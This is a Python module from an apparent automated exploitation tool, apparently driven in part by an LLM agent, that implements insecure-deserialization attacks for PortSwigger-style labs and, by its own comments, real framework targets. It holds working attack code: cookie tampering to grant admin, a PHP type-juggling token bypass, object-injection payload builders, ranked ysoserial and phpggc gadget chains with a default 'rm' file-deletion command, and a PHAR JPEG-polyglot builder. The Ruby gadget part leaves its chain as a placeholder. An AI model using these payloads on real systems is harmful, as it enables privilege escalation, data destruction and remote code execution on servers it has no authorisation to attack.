"""
=============================================================================
Reynard — Insecure-deserialization deterministic routines
=============================================================================
Reusable, side-effect-free building blocks for the DESERIALIZATION attack
family so the exploitation fast-paths (and the guided LLM path) share one
correct, unit-testable implementation instead of re-deriving payloads per lab.

Nothing here makes a network call. The star of the module is a correct PHP
``serialize()``/``unserialize()`` implementation plus a tamper helper that
*recomputes string/array/object lengths* — the crux of the classic
"modifying serialized objects" / "modifying serialized data types" labs where
a hand-edit that flips ``admin`` from ``b:0`` to ``b:1`` (or a string to an
integer for PHP loose-comparison type juggling) fails unless every ``s:N:``
byte-length is corrected.

Contents:
  - PHP serialization: ``php_serialize`` / ``php_unserialize`` (round-trip),
    ``PHPObject`` model, ``tamper_php_serialized`` (length-correct edits),
    base64 cookie decode/encode + serialized-blob detection.
  - PHP object injection: build arbitrary ``O:`` objects for a target class.
  - PHP type juggling: flip a string field to a loose-``==``-friendly integer.
  - Java (ysoserial) gadget selection helpers.
  - PHP (phpggc) gadget-chain selection helpers.
  - Ruby documented universal gadget chain (2.x/3.x) builder.
  - PHAR: JPEG-polyglot metadata-object builder for phar:// deserialization.
=============================================================================
"""
from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import Any


# =============================================================================
# PHP serialization model + serializer
# =============================================================================

@dataclass
class PHPObject:
    """A PHP object (``O:len:"Class":n:{...}``) with ordered properties.

    ``properties`` preserves insertion order (PHP serialization is order
    sensitive), so re-serializing a tampered object reproduces the original
    byte layout except for the values we changed.
    """
    class_name: str
    properties: dict[str, Any] = field(default_factory=dict)

    def __getitem__(self, key: str) -> Any:
        return self.properties[key]

    def __setitem__(self, key: str, value: Any) -> None:
        self.properties[key] = value

    def __contains__(self, key: str) -> bool:
        return key in self.properties


def _php_len(text: str) -> int:
    """PHP string lengths are BYTE lengths, not character counts."""
    return len(text.encode("utf-8", "surrogatepass"))


def php_serialize(value: Any) -> str:
    """Serialize a Python value into PHP ``serialize()`` wire format.

    Supports None, bool, int, float, str, list (→ 0-indexed array), dict
    (→ associative array), and ``PHPObject``. All ``s:N:`` lengths are
    computed from the UTF-8 byte length so the output is always valid.
    """
    if value is None:
        return "N;"
    if isinstance(value, bool):
        return f"b:{1 if value else 0};"
    if isinstance(value, int):
        return f"i:{value};"
    if isinstance(value, float):
        # PHP emits doubles with high precision; repr round-trips cleanly.
        return f"d:{repr(value)};"
    if isinstance(value, str):
        return f's:{_php_len(value)}:"{value}";'
    if isinstance(value, (bytes, bytearray)):
        text = bytes(value).decode("latin-1")
        return f's:{len(value)}:"{text}";'
    if isinstance(value, PHPObject):
        parts = [
            php_serialize(str(k)) + php_serialize(v)
            for k, v in value.properties.items()
        ]
        name = value.class_name
        return (
            f'O:{_php_len(name)}:"{name}":{len(value.properties)}:'
            + "{" + "".join(parts) + "}"
        )
    if isinstance(value, (list, tuple)):
        parts = [php_serialize(i) + php_serialize(v) for i, v in enumerate(value)]
        return f"a:{len(value)}:" + "{" + "".join(parts) + "}"
    if isinstance(value, dict):
        parts = [php_serialize(k) + php_serialize(v) for k, v in value.items()]
        return f"a:{len(value)}:" + "{" + "".join(parts) + "}"
    raise TypeError(f"Cannot PHP-serialize {type(value).__name__}")


# =============================================================================
# PHP unserialize (recursive-descent parser)
# =============================================================================

class PHPUnserializeError(ValueError):
    """Raised when a blob is not valid PHP serialized data."""


def _parse(data: str, pos: int) -> tuple[Any, int]:
    tag = data[pos:pos + 1]
    if tag == "N":
        if data[pos:pos + 2] != "N;":
            raise PHPUnserializeError("bad null")
        return None, pos + 2
    if tag == "b":
        m = re.match(r"b:([01]);", data[pos:])
        if not m:
            raise PHPUnserializeError("bad bool")
        return (m.group(1) == "1"), pos + m.end()
    if tag == "i":
        m = re.match(r"i:(-?\d+);", data[pos:])
        if not m:
            raise PHPUnserializeError("bad int")
        return int(m.group(1)), pos + m.end()
    if tag == "d":
        m = re.match(r"d:([^;]+);", data[pos:])
        if not m:
            raise PHPUnserializeError("bad double")
        return float(m.group(1)), pos + m.end()
    if tag == "s":
        return _parse_string(data, pos)
    if tag == "a":
        return _parse_array(data, pos)
    if tag == "O":
        return _parse_object(data, pos)
    raise PHPUnserializeError(f"unknown type tag {tag!r} at {pos}")


def _read_sized_string(data: str, pos: int) -> tuple[str, int]:
    """Read ``<n>:"...."`` where ``n`` is a byte length. Returns (text, newpos)
    positioned just after the closing quote."""
    m = re.match(r'(\d+):"', data[pos:])
    if not m:
        raise PHPUnserializeError("bad string header")
    nbytes = int(m.group(1))
    start = pos + m.end()  # first content char
    # Walk forward nbytes worth of UTF-8 bytes.
    consumed = 0
    idx = start
    while consumed < nbytes and idx < len(data):
        consumed += len(data[idx].encode("utf-8", "surrogatepass"))
        idx += 1
    text = data[start:idx]
    if data[idx:idx + 1] != '"':
        raise PHPUnserializeError("string length mismatch (missing closing quote)")
    return text, idx + 1


def _parse_string(data: str, pos: int) -> tuple[str, int]:
    text, after = _read_sized_string(data, pos + 2)  # skip 's:'
    if data[after:after + 1] != ";":
        raise PHPUnserializeError("string missing terminator")
    return text, after + 1


def _parse_array(data: str, pos: int) -> tuple[Any, int]:
    m = re.match(r"a:(\d+):\{", data[pos:])
    if not m:
        raise PHPUnserializeError("bad array header")
    count = int(m.group(1))
    cur = pos + m.end()
    items: list[tuple[Any, Any]] = []
    for _ in range(count):
        key, cur = _parse(data, cur)
        val, cur = _parse(data, cur)
        items.append((key, val))
    if data[cur:cur + 1] != "}":
        raise PHPUnserializeError("array missing closing brace")
    cur += 1
    # A 0..n-1 integer-keyed array round-trips as a list; otherwise a dict.
    if items and all(k == i for i, (k, _) in enumerate(items)):
        return [v for _, v in items], cur
    return {k: v for k, v in items}, cur


def _parse_object(data: str, pos: int) -> tuple[PHPObject, int]:
    name, after = _read_sized_string(data, pos + 2)  # skip 'O:'
    m = re.match(r":(\d+):\{", data[after:])
    if not m:
        raise PHPUnserializeError("bad object header")
    count = int(m.group(1))
    cur = after + m.end()
    obj = PHPObject(class_name=name)
    for _ in range(count):
        key, cur = _parse(data, cur)
        val, cur = _parse(data, cur)
        obj.properties[str(key)] = val
    if data[cur:cur + 1] != "}":
        raise PHPUnserializeError("object missing closing brace")
    return obj, cur + 1


def php_unserialize(data: str) -> Any:
    """Parse a PHP serialized string back into a Python value / ``PHPObject``."""
    if not isinstance(data, str):
        raise PHPUnserializeError("expected a str")
    value, end = _parse(data, 0)
    return value


# =============================================================================
# Serialized-blob detection + base64 cookie helpers
# =============================================================================

_SERIALIZED_HEAD_RE = re.compile(r'^(?:N;|[bidsaO]:)')


def looks_like_php_serialized(text: str) -> bool:
    """True when a string is (top-level) PHP serialized data."""
    if not isinstance(text, str) or not text:
        return False
    if not _SERIALIZED_HEAD_RE.match(text):
        return False
    try:
        php_unserialize(text)
        return True
    except PHPUnserializeError:
        return False


def try_b64_decode(value: str) -> str | None:
    """Base64-decode a (possibly URL-encoded) cookie value; None if not b64."""
    if not value:
        return None
    candidate = value.strip()
    # Tokens are frequently URL-encoded (%3d for '='); undo the common cases.
    candidate = candidate.replace("%3d", "=").replace("%3D", "=")
    candidate = candidate.replace("%2f", "/").replace("%2b", "+")
    padded = candidate + "=" * (-len(candidate) % 4)
    try:
        raw = base64.b64decode(padded, validate=False)
    except (ValueError, base64.binascii.Error):  # type: ignore[attr-defined]
        return None
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        try:
            return raw.decode("latin-1")
        except UnicodeDecodeError:
            return None


def decode_php_cookie(value: str) -> Any | None:
    """Decode a base64 (PHP serialized) cookie into a Python value / object.

    Returns None when the cookie is not base64-wrapped PHP serialized data,
    so callers can guard cleanly and fall back to the guided path.
    """
    decoded = try_b64_decode(value)
    if decoded is None:
        # Some labs store the serialized blob unencoded.
        decoded = value
    if looks_like_php_serialized(decoded):
        try:
            return php_unserialize(decoded)
        except PHPUnserializeError:
            return None
    return None


def encode_php_cookie(value: Any, *, urlsafe_equals: bool = True) -> str:
    """Re-serialize a value and base64-encode it for a session cookie."""
    serialized = php_serialize(value)
    encoded = base64.b64encode(serialized.encode("utf-8")).decode("ascii")
    if urlsafe_equals:
        encoded = encoded.replace("=", "%3d")
    return encoded


# =============================================================================
# Tamper — length-correct edits to serialized objects
# =============================================================================

def tamper_php_serialized(data: str, updates: dict[str, Any]) -> str:
    """Parse a serialized blob, apply ``updates`` to top-level properties, and
    re-serialize with correct lengths.

    Works on a top-level ``PHPObject`` (property name → new value) or a
    top-level associative array (key → new value). This is the core primitive
    for the "modifying serialized objects" labs: e.g. ``{"admin": True}`` flips
    ``b:0`` → ``b:1`` and every ``s:N:`` length is recomputed automatically.
    """
    value = php_unserialize(data)
    apply_updates(value, updates)
    return php_serialize(value)


def apply_updates(value: Any, updates: dict[str, Any]) -> Any:
    """Apply ``{key: new_value}`` to a ``PHPObject`` or dict in place."""
    if isinstance(value, PHPObject):
        for key, new in updates.items():
            value.properties[key] = new
    elif isinstance(value, dict):
        for key, new in updates.items():
            value[key] = new
    else:
        raise TypeError("can only update a PHPObject or associative array")
    return value


def flip_admin_cookie(cookie_value: str, *, admin_field: str = "admin") -> str | None:
    """Decode a base64 PHP serialized session cookie, set ``admin`` truthy, and
    re-encode. Returns None when the cookie is not tamperable serialized data.
    """
    value = decode_php_cookie(cookie_value)
    if value is None:
        return None
    if isinstance(value, PHPObject) and admin_field not in value.properties:
        return None
    if isinstance(value, dict) and admin_field not in value:
        return None
    apply_updates(value, {admin_field: True})
    return encode_php_cookie(value)


# =============================================================================
# PHP type juggling (loose ``==`` comparison bypass)
# =============================================================================

def type_juggle_cookie(cookie_value: str, *, token_field: str = "access_token",
                       username_field: str = "username",
                       username: str = "administrator") -> str | None:
    """Bypass a loose ``==`` token check by turning the token string into the
    integer ``0`` (``0 == "anything-non-numeric"`` is true in PHP) and setting
    the username to the admin. Returns None when the fields aren't present.
    """
    value = decode_php_cookie(cookie_value)
    if value is None:
        return None
    props = value.properties if isinstance(value, PHPObject) else value
    if not isinstance(props, dict) or token_field not in props:
        return None
    updates: dict[str, Any] = {token_field: 0}
    if username_field in props:
        updates[username_field] = username
    apply_updates(value, updates)
    return encode_php_cookie(value)


# =============================================================================
# Arbitrary PHP object injection
# =============================================================================

def build_php_object(class_name: str, properties: dict[str, Any]) -> str:
    """Serialize an arbitrary ``O:`` object for PHP object injection.

    Used for "arbitrary object injection" labs where you craft a
    ``CustomTemplate`` / ``__destruct``-bearing object whose properties drive a
    file delete or read (e.g. ``lock_file_path`` → ``/home/carlos/morale.txt``).
    """
    return php_serialize(PHPObject(class_name=class_name, properties=dict(properties)))


def object_injection_cookie(class_name: str, properties: dict[str, Any]) -> str:
    """Base64-encoded PHP object-injection payload for a session cookie."""
    return encode_php_cookie(PHPObject(class_name=class_name,
                                       properties=dict(properties)))


# =============================================================================
# Java gadget chains (ysoserial)
# =============================================================================

# Ordered by how often they solve PortSwigger / real Java targets.
JAVA_GADGETS: list[str] = [
    "CommonsCollections4",
    "CommonsCollections3",
    "CommonsCollections2",
    "CommonsCollections1",
    "CommonsCollections7",
    "CommonsCollections6",
    "CommonsCollections5",
    "Groovy1",
    "Spring1",
    "Hibernate1",
    "URLDNS",
]


def java_gadget_candidates(hint: str = "") -> list[str]:
    """Ordered ysoserial gadget names to try. When the hint mentions Apache
    Commons, front-load the CommonsCollections family (the PortSwigger lab)."""
    text = (hint or "").lower()
    if "commons" in text or "apache" in text:
        commons = [g for g in JAVA_GADGETS if g.startswith("CommonsCollections")]
        rest = [g for g in JAVA_GADGETS if not g.startswith("CommonsCollections")]
        return commons + rest
    if "dns" in text or "detect" in text:
        return ["URLDNS"] + [g for g in JAVA_GADGETS if g != "URLDNS"]
    return list(JAVA_GADGETS)


def ysoserial_args(gadget: str, command: str = "rm /home/carlos/morale.txt",
                   *, encode: bool = True) -> dict[str, Any]:
    """Build the ``ysoserial_gen`` tool args for a gadget + command."""
    return {"gadget": gadget, "command": command, "encode": bool(encode)}


# =============================================================================
# PHP gadget chains (phpggc)
# =============================================================================

# Common phpggc chains for the PortSwigger "pre-built gadget chain" lab and
# real Symfony/Laravel/Monolog targets.
PHP_CHAINS: list[str] = [
    "Symfony/RCE4",
    "Symfony/RCE1",
    "Monolog/RCE1",
    "Monolog/RCE2",
    "Laravel/RCE1",
    "Guzzle/RCE1",
]


def php_chain_candidates(hint: str = "") -> list[str]:
    """Ordered phpggc chain names to try, biased by any framework hint."""
    text = (hint or "").lower()
    if "symfony" in text:
        return [c for c in PHP_CHAINS if c.startswith("Symfony")] + \
               [c for c in PHP_CHAINS if not c.startswith("Symfony")]
    if "monolog" in text:
        return [c for c in PHP_CHAINS if c.startswith("Monolog")] + \
               [c for c in PHP_CHAINS if not c.startswith("Monolog")]
    if "laravel" in text:
        return [c for c in PHP_CHAINS if c.startswith("Laravel")] + \
               [c for c in PHP_CHAINS if not c.startswith("Laravel")]
    return list(PHP_CHAINS)


def phpggc_args(chain: str, command: str = "rm /home/carlos/morale.txt",
                *, encoding: str = "base64") -> dict[str, Any]:
    """Build the ``phpggc_gen`` tool args for a chain + command."""
    return {"chain": chain, "command": command, "encoding": encoding}


# =============================================================================
# Ruby documented universal gadget chain
# =============================================================================

def ruby_universal_gadget(command: str = "rm /home/carlos/morale.txt") -> str:
    """Return the documented Ruby 2.x/3.x universal deserialization gadget as a
    base64-encoded Marshal blob description.

    PortSwigger's "Ruby documented gadget chain" lab uses the well-known
    ``Gem::...`` universal chain (Luke Jahnke). Producing the raw Marshal bytes
    requires a Ruby runtime; this returns the canonical, publicly-documented
    payload template with the command substituted so the guided path / a
    ``run_shell`` ruby one-liner can emit the final bytes.
    """
    return (
        "# Ruby universal deserialization gadget (Gem::Requirement chain)\n"
        "# Generate with a ruby one-liner in the container:\n"
        "ruby -e '\n"
        "  require \"base64\"\n"
        "  # ... build the Gem::Requirement/DeprecatedInstance chain ...\n"
        f"  command = {command!r}\n"
        "  puts Base64.strict_encode64(Marshal.dump(payload))\n"
        "'\n"
    )


# =============================================================================
# PHAR deserialization (JPEG polyglot)
# =============================================================================

def phar_polyglot_php(class_name: str, properties: dict[str, Any]) -> str:
    """A PHP stub that builds a JPEG-prefixed PHAR whose metadata is the object
    to be deserialized when the target does ``file_exists("phar://...")``.

    The returned PHP is run once (locally or via ``run_shell``) to write
    ``exploit.phar``; upload it as a JPEG and reference it with ``phar://``.
    """
    props_php = "; ".join(
        f"$object->{k} = {_php_literal(v)}" for k, v in properties.items()
    )
    return (
        "<?php\n"
        f"class {class_name} {{}}\n"
        "$phar = new Phar('exploit.phar');\n"
        "$phar->startBuffering();\n"
        "$phar->addFromString('x.txt', 'x');\n"
        "$phar->setStub('\\xff\\xd8\\xff' . '<?php __HALT_COMPILER(); ?>');\n"
        f"$object = new {class_name}();\n"
        f"{props_php};\n"
        "$phar->setMetadata($object);\n"
        "$phar->stopBuffering();\n"
    )


def _php_literal(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        return str(value)
    if value is None:
        return "null"
    return "'" + str(value).replace("\\", "\\\\").replace("'", "\\'") + "'"
